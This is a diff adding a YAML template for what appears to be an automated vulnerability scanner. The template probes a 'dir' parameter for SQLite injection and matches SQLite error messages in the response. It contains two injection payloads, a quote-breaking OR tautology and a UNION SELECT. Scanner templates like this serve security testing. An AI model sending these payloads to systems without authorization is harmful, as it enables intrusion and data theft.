@@ -1,0 +1,22 @@
+id: sqli3-sqlite-03
+name: 'SQLi sqlite prefix #2 in dir'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - sqlite
+description: 'Triggers sqlite error via dir'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      dir:
+        - '''))) OR (((''1''=''1'
+        - ''') UNION SELECT 1,2--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQLite'
+          - 'sqlite3'
